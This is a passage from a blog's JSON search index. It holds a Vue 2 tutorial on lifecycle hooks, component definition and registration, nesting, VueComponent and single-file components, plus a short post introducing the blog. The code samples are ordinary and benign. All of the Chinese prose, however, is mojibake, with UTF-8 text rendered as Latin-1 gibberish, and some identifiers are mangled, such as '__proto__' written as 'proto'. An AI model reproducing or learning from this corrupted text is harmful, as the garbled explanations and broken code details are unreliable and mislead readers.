¹æ®éœ€æ±‚ç¼–å†™çš„ã€‚ ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­çš„thisæŒ‡å‘æ˜¯vm æˆ– ç»„ä»¶å®ä¾‹å¯¹è±¡ã€‚ &lt;div id=\"root\"&gt; &lt;h2 v-if=\"a\"&gt;ä½ å¥½å•Š&lt;/h2&gt; &lt;h2 :style=\"{opacity}\"&gt;æ¬¢è¿å­¦ä¹ Vue&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ a:false, opacity:1 }, methods: { }, //Vueå®Œæˆæ¨¡æ¿çš„è§£æå¹¶æŠŠåˆå§‹çš„çœŸå®DOMå…ƒç´ æ”¾å…¥é¡µé¢åï¼ˆæŒ‚è½½å®Œæ¯•ï¼‰è°ƒç”¨mounted mounted(){ console.log('mounted',this) setInterval(() =&gt; { this.opacity -= 0.01 if(this.opacity &lt;= 0) this.opacity = 1 },16) }, }) //é€šè¿‡å¤–éƒ¨çš„å®šæ—¶å™¨å®ç°ï¼ˆä¸æ¨èï¼‰ setInterval(() =&gt; { vm.opacity -= 0.01 if(vm.opacity &lt;= 0) vm.opacity = 1 },16) &lt;/script&gt; 2. åˆ†æç”Ÿå‘½å‘¨æœŸ 3. æ€»ç»“ç”Ÿå‘½å‘¨æœŸå¸¸ç”¨çš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼š mounted: å‘é€ajaxè¯·æ±‚ã€å¯åŠ¨å®šæ—¶å™¨ã€ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ã€è®¢é˜…æ¶ˆæ¯ç­‰ã€åˆå§‹åŒ–æ“ä½œã€‘ã€‚ beforeDestroy: æ¸…é™¤å®šæ—¶å™¨ã€è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶ã€å–æ¶ˆè®¢é˜…æ¶ˆæ¯ç­‰ã€æ”¶å°¾å·¥ä½œã€‘ã€‚ å…³äºé”€æ¯Vueå®ä¾‹ é”€æ¯åå€ŸåŠ©Vueå¼€å‘è€…å·¥å…·çœ‹ä¸åˆ°ä»»ä½•ä¿¡æ¯ã€‚ é”€æ¯åè‡ªå®šä¹‰äº‹ä»¶ä¼šå¤±æ•ˆï¼Œä½†åŸç”ŸDOMäº‹ä»¶ä¾ç„¶æœ‰æ•ˆã€‚ ä¸€èˆ¬ä¸ä¼šåœ¨beforeDestroyæ“ä½œæ•°æ®ï¼Œå› ä¸ºå³ä¾¿æ“ä½œæ•°æ®ï¼Œä¹Ÿä¸ä¼šå†è§¦å‘æ›´æ–°æµç¨‹äº†ã€‚ &lt;div id=\"root\"&gt; &lt;h2 :style=\"{opacity}\"&gt;æ¬¢è¿å­¦ä¹ Vue&lt;/h2&gt; &lt;button @click=\"opacity = 1\"&gt;é€æ˜åº¦è®¾ç½®ä¸º1&lt;/button&gt; &lt;button @click=\"stop\"&gt;ç‚¹æˆ‘åœæ­¢å˜æ¢&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ opacity:1 }, methods: { stop(){ this.$destroy() } }, //Vueå®Œæˆæ¨¡æ¿çš„è§£æå¹¶æŠŠåˆå§‹çš„çœŸå®DOMå…ƒç´ æ”¾å…¥é¡µé¢åï¼ˆæŒ‚è½½å®Œæ¯•ï¼‰è°ƒç”¨mounted mounted(){ console.log('mounted',this) this.timer = setInterval(() =&gt; { console.log('setInterval') this.opacity -= 0.01 if(this.opacity &lt;= 0) this.opacity = 1 },16) }, beforeDestroy() { clearInterval(this.timer) console.log('vmå³å°†é©¾é¹¤è¥¿æ¸¸äº†') }, }) &lt;/script&gt; éå•æ–‡ä»¶ç»„ä»¶1. åŸºæœ¬ä½¿ç”¨Vueä¸­ä½¿ç”¨ç»„ä»¶çš„ä¸‰å¤§æ­¥éª¤ï¼š ä¸€ã€å®šä¹‰ç»„ä»¶(åˆ›å»ºç»„ä»¶)äºŒã€æ³¨å†Œç»„ä»¶ä¸‰ã€ä½¿ç”¨ç»„ä»¶(å†™ç»„ä»¶æ ‡ç­¾) ä¸€ã€å¦‚ä½•å®šä¹‰ä¸€ä¸ªç»„ä»¶ï¼Ÿä½¿ç”¨Vue.extend(options)åˆ›å»ºï¼Œå…¶ä¸­optionså’Œnew Vue(options)æ—¶ä¼ å…¥çš„é‚£ä¸ªoptionså‡ ä¹ä¸€æ ·ï¼Œä½†ä¹Ÿæœ‰ç‚¹åŒºåˆ«ï¼›åŒºåˆ«å¦‚ä¸‹ï¼š elä¸è¦å†™ï¼Œä¸ºä»€ä¹ˆï¼Ÿ â€”â€”â€” æœ€ç»ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½è¦ç»è¿‡ä¸€ä¸ªvmçš„ç®¡ç†ï¼Œç”±vmä¸­çš„elå†³å®šæœåŠ¡å“ªä¸ªå®¹å™¨ã€‚ dataå¿…é¡»å†™æˆå‡½æ•°ï¼Œä¸ºä»€ä¹ˆï¼Ÿ â€”â€”â€”â€” é¿å…ç»„ä»¶è¢«å¤ç”¨æ—¶ï¼Œæ•°æ®å­˜åœ¨å¼•ç”¨å…³ç³»ã€‚ å¤‡æ³¨ï¼šä½¿ç”¨templateå¯ä»¥é…ç½®ç»„ä»¶ç»“æ„ã€‚ äºŒã€å¦‚ä½•æ³¨å†Œç»„ä»¶ï¼Ÿ å±€éƒ¨æ³¨å†Œï¼šé new Vueçš„æ—¶å€™ä¼ å…¥componentsé€‰é¡¹ å…¨å±€æ³¨å†Œï¼šé Vue.component(â€˜ç»„ä»¶åâ€™,ç»„ä»¶) ä¸‰ã€ç¼–å†™ç»„ä»¶æ ‡ç­¾ï¼š&lt;school&gt;&lt;/school&gt; &lt;div id=\"root\"&gt; &lt;hello&gt;&lt;/hello&gt; &lt;hr&gt; &lt;h1&gt;{{msg}}&lt;/h1&gt; &lt;hr&gt; &lt;!-- ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ç»„ä»¶æ ‡ç­¾ --&gt; &lt;school&gt;&lt;/school&gt; &lt;hr&gt; &lt;!-- ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ç»„ä»¶æ ‡ç­¾ --&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; &lt;div id=\"root2\"&gt; &lt;hello&gt;&lt;/hello&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºschoolç»„ä»¶ const school = Vue.extend({ template:` &lt;div class=\"demo\"&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{schoolName}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;ç‚¹æˆ‘æç¤ºå­¦æ ¡å&lt;/button&gt; &lt;/div&gt; `, // el:'#root', //ç»„ä»¶å®šä¹‰æ—¶ï¼Œä¸€å®šä¸è¦å†™elé…ç½®é¡¹ï¼Œå› ä¸ºæœ€ç»ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½è¦è¢«ä¸€ä¸ªvmç®¡ç†ï¼Œç”±vmå†³å®šæœåŠ¡äºå“ªä¸ªå®¹å™¨ã€‚ data(){ return { schoolName:'Serein', address:'Sereinblogæ˜Œå¹³' } }, methods: { showName(){ alert(this.schoolName) } }, }) //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºstudentç»„ä»¶ const student = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;å­¦ç”Ÿå§“åï¼š{{studentName}}&lt;/h2&gt; &lt;h2&gt;å­¦ç”Ÿå¹´é¾„ï¼š{{age}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { studentName:'å¼ ä¸‰', age:18 } } }) //ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºhelloç»„ä»¶ const hello = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;ä½ å¥½å•Šï¼{{name}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { name:'Tom' } } }) //ç¬¬äºŒæ­¥ï¼šå…¨å±€æ³¨å†Œç»„ä»¶ Vue.component('hello',hello) //åˆ›å»ºvm new Vue({ el:'#root', data:{ msg:'ä½ å¥½å•Šï¼' }, //ç¬¬äºŒæ­¥ï¼šæ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨æ³¨å†Œï¼‰ components:{ school, student } }) new Vue({ el:'#root2', }) &lt;/script&gt; 2. å‡ ä¸ªæ³¨æ„ç‚¹ å…³äºç»„ä»¶å: ä¸€ä¸ªå•è¯ç»„æˆï¼š ç¬¬ä¸€ç§å†™æ³•(é¦–å­—æ¯å°å†™)ï¼šschool ç¬¬äºŒç§å†™æ³•(é¦–å­—æ¯å¤§å†™)ï¼šSchool å¤šä¸ªå•è¯ç»„æˆï¼š ç¬¬ä¸€ç§å†™æ³•(kebab-caseå‘½å)ï¼šmy-school ç¬¬äºŒç§å†™æ³•(CamelCaseå‘½å)ï¼šMySchool (éœ€è¦Vueè„šæ‰‹æ¶æ”¯æŒ) å¤‡æ³¨ï¼š ç»„ä»¶åå°½å¯èƒ½å›é¿HTMLä¸­å·²æœ‰çš„å…ƒç´ åç§°ï¼Œä¾‹å¦‚ï¼šh2ã€H2éƒ½ä¸è¡Œã€‚ å¯ä»¥ä½¿ç”¨nameé…ç½®é¡¹æŒ‡å®šç»„ä»¶åœ¨å¼€å‘è€…å·¥å…·ä¸­å‘ˆç°çš„åå­—ã€‚ å…³äºç»„ä»¶æ ‡ç­¾: ç¬¬ä¸€ç§å†™æ³•ï¼š&lt;school&gt;&lt;/school&gt; ç¬¬äºŒç§å†™æ³•ï¼š&lt;school/&gt; å¤‡æ³¨ï¼šä¸ç”¨ä½¿ç”¨è„šæ‰‹æ¶æ—¶ï¼Œä¼šå¯¼è‡´åç»­ç»„ä»¶ä¸èƒ½æ¸²æŸ“ã€‚ ä¸€ä¸ªç®€å†™æ–¹å¼ï¼š const school = Vue.extend(options) å¯ç®€å†™ä¸ºï¼šconst school = options 3. ç»„ä»¶çš„åµŒå¥—&lt;div id=\"root\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //å®šä¹‰studentç»„ä»¶ const student = Vue.extend({ name:'student', template:` &lt;div&gt; &lt;h2&gt;å­¦ç”Ÿå§“åï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦ç”Ÿå¹´é¾„ï¼š{{age}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { name:'Serein', age:18 } } }) //å®šä¹‰schoolç»„ä»¶ const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:'Sereinblog' } }, //æ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨ï¼‰ components:{ student } }) //å®šä¹‰helloç»„ä»¶ const hello = Vue.extend({ template:`&lt;h1&gt;{{msg}}&lt;/h1&gt;`, data(){ return { msg:'æ¬¢è¿æ¥åˆ°Sereinå­¦ä¹ ï¼' } } }) //å®šä¹‰appç»„ä»¶ const app = Vue.extend({ template:` &lt;div&gt; &lt;hello&gt;&lt;/hello&gt; &lt;school&gt;&lt;/school&gt; &lt;/div&gt; `, components:{ school, hello } }) //åˆ›å»ºvm new Vue({ template:'&lt;app&gt;&lt;/app&gt;', el:'#root', //æ³¨å†Œç»„ä»¶ï¼ˆå±€éƒ¨ï¼‰ components:{app} }) &lt;/script&gt; 4. VueComponentå…³äºVueComponentï¼š schoolç»„ä»¶æœ¬è´¨æ˜¯ä¸€ä¸ªåä¸ºVueComponentçš„æ„é€ å‡½æ•°ï¼Œä¸”ä¸æ˜¯ç¨‹åºå‘˜å®šä¹‰çš„ï¼Œæ˜¯Vue.extendç”Ÿæˆçš„ã€‚ æˆ‘ä»¬åªéœ€è¦å†™&lt;school/&gt;æˆ–&lt;school&gt;&lt;/school&gt;ï¼ŒVueè§£ææ—¶ä¼šå¸®æˆ‘ä»¬åˆ›å»ºschoolç»„ä»¶çš„å®ä¾‹å¯¹è±¡ï¼Œ å³Vueå¸®æˆ‘ä»¬æ‰§è¡Œçš„ï¼šnew VueComponent(options)ã€‚ ç‰¹åˆ«æ³¨æ„ï¼šæ¯æ¬¡è°ƒç”¨Vue.extendï¼Œè¿”å›çš„éƒ½æ˜¯ä¸€ä¸ªå…¨æ–°çš„VueComponentï¼ï¼ï¼ï¼ å…³äºthisæŒ‡å‘ï¼š ç»„ä»¶é…ç½®ä¸­ï¼š dataå‡½æ•°ã€methodsä¸­çš„å‡½æ•°ã€watchä¸­çš„å‡½æ•°ã€computedä¸­çš„å‡½æ•° å®ƒä»¬çš„thiså‡æ˜¯ã€VueComponentå®ä¾‹å¯¹è±¡ã€‘ã€‚ new Vue(options)é…ç½®ä¸­ï¼š dataå‡½æ•°ã€methodsä¸­çš„å‡½æ•°ã€watchä¸­çš„å‡½æ•°ã€computedä¸­çš„å‡½æ•° å®ƒä»¬çš„thiså‡æ˜¯ã€Vueå®ä¾‹å¯¹è±¡ã€‘ã€‚ VueComponentçš„å®ä¾‹å¯¹è±¡ï¼Œä»¥åç®€ç§°vcï¼ˆä¹Ÿå¯ç§°ä¹‹ä¸ºï¼šç»„ä»¶å®ä¾‹å¯¹è±¡ï¼‰ã€‚ Vueçš„å®ä¾‹å¯¹è±¡ï¼Œä»¥åç®€ç§°vmã€‚ &lt;div id=\"root\"&gt; &lt;school&gt;&lt;/school&gt; &lt;hello&gt;&lt;/hello&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //å®šä¹‰schoolç»„ä»¶ const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;ç‚¹æˆ‘æç¤ºå­¦æ ¡å&lt;/button&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:'Sereinblog' } }, methods: { showName(){ console.log('showName',this) } }, }) const test = Vue.extend({ template:`&lt;span&gt;blog&lt;/span&gt;` }) //å®šä¹‰helloç»„ä»¶ const hello = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;{{msg}}&lt;/h2&gt; &lt;test&gt;&lt;/test&gt; &lt;/div&gt; `, data(){ return { msg:'ä½ å¥½å•Šï¼' } }, components:{test} }) // console.log('@',school) // console.log('#',hello) //åˆ›å»ºvm const vm = new Vue({ el:'#root', components:{school,hello} }) &lt;/script&gt; 5. ä¸€ä¸ªé‡è¦çš„å†…ç½®å…³ç³»VueComponent.prototype.proto === Vue.prototype ä¸ºä»€ä¹ˆè¦æœ‰è¿™ä¸ªå…³ç³»ï¼šè®©ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼ˆvcï¼‰å¯ä»¥è®¿é—®åˆ° VueåŸå‹ä¸Šçš„å±æ€§ã€æ–¹æ³•ã€‚ &lt;div id=\"root\"&gt; &lt;school&gt;&lt;/school&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.prototype.x = 99 //å®šä¹‰schoolç»„ä»¶ const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;button @click=\"showX\"&gt;ç‚¹æˆ‘è¾“å‡ºx&lt;/button&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:\"Sereinblog\" } }, methods: { showX(){ console.log(this.x) } }, }) //åˆ›å»ºä¸€ä¸ªvm const vm = new Vue({ el:'#root', data:{ msg:'ä½ å¥½' }, components:{school} }) //å®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•° function Demo(){ this.a = 1 this.b = 2 } //åˆ›å»ºä¸€ä¸ªDemoçš„å®ä¾‹å¯¹è±¡ const d = new Demo() console.log(Demo.prototype) //æ˜¾ç¤ºåŸå‹å±æ€§ console.log(d.__proto__) //éšå¼åŸå‹å±æ€§ console.log(Demo.prototype === d.__proto__) //ç¨‹åºå‘˜é€šè¿‡æ˜¾ç¤ºåŸå‹å±æ€§æ“ä½œåŸå‹å¯¹è±¡ï¼Œè¿½åŠ ä¸€ä¸ªxå±æ€§ï¼Œå€¼ä¸º99 Demo.prototype.x = 99 console.log('@',d) &lt;/script&gt; å•æ–‡ä»¶ç»„ä»¶&lt;body&gt; &lt;!-- å‡†å¤‡ä¸€ä¸ªå®¹å™¨ --&gt; &lt;div id=\"root\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\" src=\"../js/vue.js\"&gt;&lt;/script&gt; &lt;/body&gt; import App from './App.vue' new Vue({ el:'#root', template:`&lt;App&gt;&lt;/App&gt;`, components:{App}, }) &lt;template&gt; &lt;div&gt; &lt;School&gt;&lt;/School&gt; &lt;Student&gt;&lt;/Student&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; //å¼•å…¥ç»„ä»¶ import School from './School.vue' import Student from './Student.vue' export default { name:'App', components:{ School, Student } } &lt;/script&gt; &lt;template&gt; &lt;div class=\"demo\"&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;ç‚¹æˆ‘æç¤ºå­¦æ ¡å&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name:'School', data(){ return { name:'Serein', address:'Sereinblog' } }, methods: { showName(){ alert(this.name) } }, } &lt;/script&gt; &lt;style&gt; .demo{ background-color: orange; } &lt;/style&gt; &lt;template&gt; &lt;div&gt; &lt;h2&gt;å­¦ç”Ÿå§“åï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦ç”Ÿå¹´é¾„ï¼š{{age}}&lt;/h2&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name:'Student', data(){ return { name:'å¼ ä¸‰', age:18 } } } &lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"}],"tags":[{"name":"Vue2","slug":"Vue2","permalink":"https://serein.icu/tags/Vue2/"}]},{"title":"åšå®¢ä¸åšä¸»","slug":"01-åšå®¢è¯ç”Ÿ","date":"2022-03-11T02:07:00.000Z","updated":"2022-03-12T05:01:24.126Z","comments":true,"path":"posts/1.html","link":"","permalink":"https://serein.icu/posts/1.html","excerpt":"","text":"ç›¸é‡çš†æ˜¯ç¼˜åˆ† ä¸ºä»€ä¹ˆå»ºåšå®¢ï¼Ÿçº¯å±ä¸ªäººå…´è¶£ï¼Œæ‹¥æœ‰ä¸€ä¸ªè‡ªå·±çš„åšå®¢ï¼Œä¼šæœ‰å°è®¸æˆå°±æ„Ÿå§ï¼Œè®°å½•ä¸€äº›è‡ªå·±æ„Ÿå…´è¶£çš„äº‹æˆ–ç‰©ã€‚ å±•æœ›åšå®¢æˆ‘ä¼šæ•´ç†ä¸€äº›ä¸ªäººæ‰€å­¦çš„çŸ¥è¯†ï¼Œä»¥åŠåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›éš¾ç‚¹å’Œè¸©è¿‡çš„å‘ï¼Œæˆ–ç”Ÿæ´»ä¸­æœ‰è¶£çš„äº‹å‘åˆ°åšå®¢ä¸Šä¸å¤§å®¶ä¸€åŒåˆ†äº«ï¼ å…³äºåšä¸»çƒ­çˆ±å‰ç«¯ï¼Œä¸æ–­å‰è¡Œ å¯„è¯­ï¼š â€‹ Time waits for no one. â€‹ Treasure every moment you have. â€‹ æ—¶é—´ä¸ç­‰äººï¼Œçæƒœä½ æ‰€æ‹¥æœ‰çš„æ¯åˆ†æ¯ç§’å§ï¼","categories":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"https://serein.icu/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"æƒ³æ³•","slug":"æƒ³æ³•","permalink":"https://serein.icu/tags/%E6%83%B3%E6%B3%95/"}]}],"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://serein.icu/categories/JavaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"},{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"https://serein.icu/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"Promise","slug":"Promise","permalink":"https://serein.icu/tags/Promise/"},{"name":"js","slug":"js","permalink":"https://serein.icu/tags/js/"},{"name":"ES6","slug":"ES6","permalink":"https://serein.icu/tags/ES6/"},{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/tags/Vue/"},{"name":"Vue2","slug":"Vue2","permalink":"https://serein.icu/tags/Vue2/"},{"name":"æƒ³æ³•","slug":"æƒ³æ³•","permalink":"https://serein.icu/tags/%E6%83%B3%E6%B3%95/"}]}